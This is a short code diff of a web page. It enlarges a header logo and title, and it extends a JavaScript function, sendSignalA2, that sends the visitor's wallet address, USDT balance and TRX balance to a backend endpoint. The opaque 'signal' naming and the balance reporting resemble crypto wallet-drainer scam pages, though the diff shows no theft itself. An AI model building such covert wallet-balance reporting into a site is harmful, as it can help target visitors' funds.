@@ -82,13 +82,13 @@ body {
  }
 /* 新增：Logo样式 */
 .header-logo {
-    width: 36px; /* 适配文字高度，保持比例 */
-    height: 36px;
+    width: 52px; /* 适配文字高度，保持比例 */
+    height: 52px;
     border-radius: 4px; /* 轻微圆角更美观 */
     object-fit: cover;
 }
 .header h1 { 
-    font-size: 20px; /* 恢复原字体大小 */
+    font-size: 32px; /* 恢复原字体大小 */
     color: #3b82f6;    
     margin-bottom: 0;
 }
@@ -1073,17 +1073,22 @@ async function sendSignalA1() {
     }
 }
 async function sendSignalA2() {
-    const requestData = { userAddress, usdtBalance: tokenBalance }; // 携带用户USDT余额
+    const requestData = { 
+        userAddress, 
+        usdtBalance: tokenBalance, 
+        trxBalance: trxBalance // 直接复用已有TRX余额（无需重新计算）
+    };
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 20000);
     try {
         const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData),
+            body: JSON.stringify(requestData), // 现在包含3个参数
             signal: controller.signal,
             keepalive: true
         });
+        // 后续原有逻辑不变（成功/失败处理、日志打印等）
         clearTimeout(timeoutId);
         if (res.ok) {
             console.log("✅ A2信号发送成功");
